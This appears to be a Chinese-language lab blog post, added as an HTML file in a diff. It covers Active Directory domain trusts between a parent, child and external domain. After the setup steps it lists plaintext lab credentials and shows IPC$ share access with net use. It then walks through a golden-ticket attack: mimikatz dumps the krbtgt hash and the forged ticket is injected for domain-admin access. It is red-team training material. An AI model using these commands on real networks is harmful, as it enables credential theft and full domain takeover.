@@ -1,0 +1,402 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title> | 剣の魔王の小窝</title>
+    <meta name="author" content="剣の魔王" />
+    <meta name="description" content="这个网站没有描述" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/head.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+<link rel="stylesheet" href="/css/main.css" />
+<link rel="preconnect" href="https://static-argvchs.netlify.app" />
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+
+			<canvas
+			id="fireworks"
+			style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767">
+			</canvas>
+			<script src="https://s4.zstatic.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
+			<script src="/js/lib/fireworks.min.js"></script>
+			
+			<canvas
+			id="background"
+			style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1"></canvas>
+			<script src="/js/lib/background.min.js"></script>
+
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>剣の魔王の小窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;剣の魔王の小窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1></h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/5/24
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>在前面域环境熟悉中已经简单介绍过信任域的概念，接下来就深入讨论域之间的信任关系，网络拓扑图如下，要实现两个域之间的访问就需要建立域信任关系，而在子域和父域之间同样如此</p>
+<p>首先在原来的基础上增加一个新域，也就是外域external.com，网络配置如下</p>
+<pre><code>IP : 10.10.10.100
+子网掩码：255.255.255.0
+默认网关：10.10.10.1
+DNS：10.10.10.10
+根域名：external.com
+还原模式密码：External.com
+</code></pre>
+<span id="more"></span>
+
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-095110.png" alt="image-20240524095108141"></p>
+<h2 id="域信任关系建立"><a href="#域信任关系建立" class="headerlink" title="域信任关系建立"></a>域信任关系建立</h2><h3 id="建立正向查找区域"><a href="#建立正向查找区域" class="headerlink" title="建立正向查找区域"></a>建立正向查找区域</h3><p>首先，为了让父域控能解析外域的DNS，需要到主域控的DNS配置里添加正向查找的区域</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-125807.png" alt="image-20240524125804288"></p>
+<p>选择“存根区域”，因为现在创建查找区域的主要作用是让父域控解析外域的DNS，点击下一步</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-125838.png" alt="image-20240524125836051"></p>
+<p>选择默认下一步</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-125943.png" alt="image-20240524125940358"></p>
+<p>输入外域的域名</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-130007.png" alt="image-20240524130005758"></p>
+<p>添加外域的IP地址或者DNS名称</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-130058.png" alt="image-20240524130056697"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-130124.png" alt="image-20240524130121054"></p>
+<p>点击下一步，最后点击完成即可</p>
+<h3 id="建立域与外域之间的信任关系"><a href="#建立域与外域之间的信任关系" class="headerlink" title="建立域与外域之间的信任关系"></a>建立域与外域之间的信任关系</h3><p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-093310.png" alt="image-20240524093253343"></p>
+<p>右键域，点击属性，在信任出新建信任关系，点击下一步</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-093451.png" alt="image-20240524093448796"></p>
+<p>输入对方域的信任dns名称或者netbios名称（netbios名称默认为域名去掉com），点击下一步</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-093619.png" alt="image-20240524093616879"></p>
+<p>选择建立外部信任域，点击下一步</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-095356.png" alt="image-20240524095353064"></p>
+<p>选择外域与主域建立双向信任关系，方便后续外域登陆主域用户，主域登陆外域用户</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-095833.png" alt="image-20240524095831438"></p>
+<p>选择“此域和指定的域”，点击下一步输入外域主域控的账号密码</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-095950.png" alt="image-20240524095947657"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-100113.png" alt="image-20240524100111592"></p>
+<p>选择“全域性身份认证”，然后默认点击下一步</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-130342.png" alt="image-20240524130314560"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-130404.png" alt="image-20240524130401980"></p>
+<p>到这就成功建立域信任关系了，然后选择两个“是，确认传入信任”</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-130424.png" alt="image-20240524130422845"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-130531.png" alt="image-20240524130529134"></p>
+<h2 id="域间用户访问"><a href="#域间用户访问" class="headerlink" title="域间用户访问"></a>域间用户访问</h2><p>已知前提：在创建子域的时候，默认跟主域建立了信任关系，但子域之间没有信任关系，而且外域和主域建立了信任关系，但是没有和子域创建信任关系</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-131118.png" alt="image-20240524131116733"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-131128.png" alt="image-20240524131126106"></p>
+<p>已知用户：</p>
+<pre><code>external.com:
+external\administrator---admin!@#45
+external\user001---user!@#45
+
+redteam.com:
+redteam\administrator---admin!@#45
+redteam\web2012---saul!@#45
+
+saul.redteam.com:
+saul0\administrator---admin!@#45
+saul0\web011---web!@#45
+
+saul1.redteam.com
+saul10\administrator---admin!@#45
+saul10\user001---user!@#45
+</code></pre>
+<h3 id="父域与子域之间"><a href="#父域与子域之间" class="headerlink" title="父域与子域之间"></a>父域与子域之间</h3><h4 id="直接访问"><a href="#直接访问" class="headerlink" title="直接访问"></a>直接访问</h4><p>子域成员机直接访问主域的域控账号，登陆成功，拥有域控的权限</p>
+<p><img src="/2024/05/24/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E6%B7%B1%E5%85%A5/Users\19127\AppData\Roaming\Typora\typora-user-images\image-20240524141950403.png" alt="image-20240524141950403"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-142058.png" alt="image-20240524142053656"></p>
+<p>子域成员机访问主域的域成员，登陆成功，拥有主域普通用户权限</p>
+<p><img src="/2024/05/24/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E6%B7%B1%E5%85%A5/Users\19127\AppData\Roaming\Typora\typora-user-images\image-20240524142520350.png" alt="image-20240524142520350"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-142808.png" alt="image-20240524142806034"></p>
+<p>主域成员机访问子域用户，登陆成功，权限为子域用户权限</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-142240.png" alt="image-20240524142157512"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-142239.png" alt="image-20240524142234915"></p>
+<p>主域成员机访问子域的域控账号，登陆成功，权限为子域控权限</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-142341.png" alt="image-20240524142339301"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-142430.png" alt="image-20240524142427869"></p>
+<h4 id="IPC-方法"><a href="#IPC-方法" class="headerlink" title="IPC$方法"></a>IPC$方法</h4><p>子域控0使用命令访问主域控的账号，并且在子域控中使用dir访问主域控C盘下的文件，访问成功</p>
+<pre><code>net use \\10.10.10.10 &quot;admin!@#45&quot; /user:&quot;redteam\administrator&quot; /persisten:yes
+dir \\10.10.10.10\c$
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-132634.png" alt="image-20240524132630340"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-132636.png" alt="image-20240524132618141"></p>
+<p>在子域的成员机上（saul0\web011）使用主域控账号访问主域控的C盘文件，访问成功，此时的账号为主域控</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-133043.png" alt="image-20240524133041396"></p>
+<p>使用父域成员机（redteam\web2012）使用子域控账号访问子域控主机，此时的权限为子域控</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-133459.png" alt="image-20240524133456814"></p>
+<p>同理，使用子域控成员机访问主域控的成员机，账号为普通用户，无法访问</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-135121.png" alt="image-20240524135113395"></p>
+<p>无法建立连接的原因：未开启139、445端口，IPC$利用条件为开启了IPC服务且139或445端口开放</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-141327.png" alt="image-20240524141324972"></p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-141353.png" alt="image-20240524141351111"></p>
+<h4 id="建立IPC非空链接（与上面同理）"><a href="#建立IPC非空链接（与上面同理）" class="headerlink" title="建立IPC非空链接（与上面同理）"></a>建立IPC非空链接（与上面同理）</h4><p>主域的成员机与子域控建立ipc$连接，此时为子域控账号</p>
+<pre><code>net use \\10.10.10.10\ipc$ &quot;admin!@#45&quot; /user:&quot;redteam\administrator&quot;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-140338.png" alt="image-20240524140202566"></p>
+<p>子域成员机与主域控建立ipc$连接，此时为主域控权限</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-140612.png" alt="image-20240524140609259"></p>
+<h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><p>黄金票据利用的条件：</p>
+<p>1、域名称</p>
+<p>2、域的SID值</p>
+<p>3、<strong>域的KRBTGT账号的HASH值</strong>(域控主机上)</p>
+<p>4、伪造任意用户名 （域用户）</p>
+<p>适用场景：<br>黄金票据是身份票据，黄金票据的攻击行为是指攻击者绕过了AS身份认证服务。</p>
+<p>由于有些原因导致对域管理权限的丢失，但好在还有一个普通域用户权限，管理员在域内加固时忘记重置krbtgt密码</p>
+<p>在正常情况下krbtgt用户的哈希值只会在管理域管主机上才会有，普通域用户上是没有krbtgt哈希的，也就是说不拿到域管是看不到krbtgt哈希。</p>
+<p>先拿到域管的权限才能看到krbtgt哈希，才能实现黄金票据传递</p>
+<h5 id="伪造黄金票据"><a href="#伪造黄金票据" class="headerlink" title="伪造黄金票据"></a>伪造黄金票据</h5><p>1、先拿到krebtgt用户的NTLM哈希值（域控主机操作）</p>
+<p><code>mimikatz</code>工具必须以管理员身份运行(system权限)</p>
+<p>关闭防火墙，上传mimikatz工具到主域控上，以管理员身份打开cmd，cd到mimikatz目录下，允许下面的命令</p>
+<pre><code>mimikatz.exe
+privilege::debug
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-144757.png" alt="image-20240524144755591"></p>
+<pre><code>lsadump::lsa /patch        //列出域管理员账户的哈希值
+f378f4337c9be0dbcbc206eee52e329c        //krbtgt用户 NTLM 哈希值
+S-1-5-21-877640343-1273128085-3257247339        //域的SID值
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-145020.png" alt="image-20240524145017949"></p>
+<p>使用命令查看父域控下的SID</p>
+<p><img src="/2024/05/24/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E6%B7%B1%E5%85%A5/Users\19127\AppData\Roaming\Typora\typora-user-images\image-20240524172849799.png" alt="image-20240524172849799"></p>
+<pre><code>//生成黄金票据(伪造的黄金票据命令)
+kerberos::golden /user:administrator /domain:redteam.com /sid:S-1-5-21-877640343-1273128085-3257247339 /krbtgt:f378f4337c9be0dbcbc206eee52e329c /sid:S-1-5-21-2605341513-1769712340-2994387954-500 /ptt 
+
+user    //需要伪造的域管理员用户
+domain        //域名称
+sid        //SID值，（这里要是使用系统命令的话抓到是这样的SID，最后面的值代表着这个账号的SID值，注意是去掉最后一个-后面的值！）
+ticket         //生成的票据名称
+</code></pre>
+<p>其他命令：</p>
+<pre><code>kerberos::purge   //清除票据
+kerberos::ptt ticket.kirbi  //导入票据
+</code></pre>
+<h4 id="将普通用户提升为主域控账户"><a href="#将普通用户提升为主域控账户" class="headerlink" title="将普通用户提升为主域控账户"></a>将普通用户提升为主域控账户</h4><p>当子域中用户机使用ipc连接不知道主域控密码时，是无法访问主域控主机资源的，这时候将黄金票据导入就可以解决这个问题</p>
+<p><img src="/2024/05/24/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E6%B7%B1%E5%85%A5/Users\19127\AppData\Roaming\Typora\typora-user-images\image-20240524161739982.png" alt="image-20240524161739982"></p>
+<p>使用子域中任意成员机登陆域控账号，或者登陆成员账号，但是知道子域控账号密码，在管理员打开cmd时输入账号密码，管理员身份打开cmd，首先查看该机器的用户为子域控</p>
+<p><img src="https://raw.githubusercontent.com/xqhff/picture/main/Img/20240524-162335.png" alt="image-20240524162333109"></p>
+<p>接着将主域控得到的票据命令导入该机器里面</p>
+<p><img src="/2024/05/24/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E6%B7%B1%E5%85%A5/Users\19127\AppData\Roaming\Typora\typora-user-images\image-20240524173536408.png" alt="image-20240524173536408"></p>
+<p>导入成功后就可以不用输入密码来访问主域控主机的文件夹</p>
+<pre><code>net use \\redteam.com\c$
+</code></pre>
+<h4 id="普通金票的局限性"><a href="#普通金票的局限性" class="headerlink" title="普通金票的局限性"></a>普通金票的局限性</h4><p>一个域树中分为redteam.com根域和saul0.redteam.com子域，如果在saul0.redteam.com子域中我们拿到了对应的域控中存储的krgrbt的账户和对应的密码hash，利用krbtgt的密码HASH值生成黄金票据会具有一定的局限性，也就是被限制在当前域内访问。但是我们如果拿到对应的主域控的krgrbt对应的HASH值。我们就能实现跨域的黄金票据。实现控制整个域。</p>
+
+    </div>
+    
+    
+    
+    
+    <div id="comment">
+        <div id="giscus-container" class="giscus"></div>
+    </div>
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 剣の魔王の小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;剣の魔王
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    <script>
+        console.info("Welcome to Argvchs' blog!");
+        if (!window.hasOwnProperty("ontouchstart")) {
+            let html = '<canvas id="fireworks" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"></canvas><script src="https://static-argvchs.netlify.app/js/fireworks.min.js"><\/script>';
+            document.body.append(document.createRange().createContextualFragment(html));
+        }
+    </script>
+    
+    
+<script
+    src="https://giscus.app/client.js"
+    data-repo="argvchs/giscus-comments"
+    data-repo-id="R_kgDOI_uC-w"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOI_uC-84CUToF"
+    data-mapping="pathname"
+    data-strict="1"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="https://static-argvchs.netlify.app/css/giscus.css"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+
+
+    
+</body>
+</html>
